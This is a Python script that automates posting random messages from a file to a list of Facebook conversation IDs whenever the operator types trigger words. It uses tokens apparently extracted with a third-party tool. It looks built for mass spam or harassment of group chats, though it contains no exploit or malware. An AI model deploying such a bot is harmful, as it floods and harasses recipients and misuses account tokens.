import requests
import json
import sys
import os
import random

def load_config():
    config = {}
    with open('config.txt', 'r') as file:
        for line in file:
            if '=' in line:
                key, value = line.strip().split('=', 1)
                config[key] = value
    return config

def save_user_id_token(user_id_token):
    with open('config.txt', 'a') as file:
        file.write(f'user_id_token={user_id_token}\n')
    print("[+] User ID token added to config.txt.")

def load_messages():
    with open('commands.txt', 'r') as file:
        messages = [line.strip() for line in file if line.strip()]  # Remove empty lines
    return messages

def load_convo_ids():
    with open('convo.txt', 'r') as file:
        convo_ids = [line.strip() for line in file if line.strip()]  # Remove empty lines
    return convo_ids

def send_message(user_id, message, access_token):
    url = f"https://graph.facebook.com/v15.0/{user_id}/messages"
    parameters = {
        'access_token': access_token,
        'message': message
    }
    response = requests.post(url, json=parameters)

    if response.ok:
        print(f"[+] Message sent to {user_id}: {message}")
    else:
        print(f"[x] Failed to send message to {user_id}: {response.text}")

def process_commands(config, messages, convo_ids):
    access_token = config['user_id_token']

    # Define commands
    commands = ["bot", "taklu", "beta", "babu"]

    while True:
        user_input = input("Enter command: ").strip().lower()

        if user_input in commands:
            message = random.choice(messages)  # Select a random message from the list
            for convo_id in convo_ids:  # Send message to each convo_id in the list
                send_message(convo_id, message, access_token)
        else:
            print("[-] Invalid command!")

def main():
    app_token = input("Enter your app token (from Facebook Developer Tool): ")
    
    with open('config.txt', 'a') as file:
        file.write(f'app_token={app_token}\n')
    print("[+] App token added to config.txt.")

    user_id_token = input("Enter your user ID token (retrieved via VinhTool): ")
    save_user_id_token(user_id_token)

    config = load_config()
    messages = load_messages()  # Load messages from commands.txt
    convo_ids = load_convo_ids()  # Load group UIDs from convo.txt

    process_commands(config, messages, convo_ids)

if __name__ == '__main__':
    main()
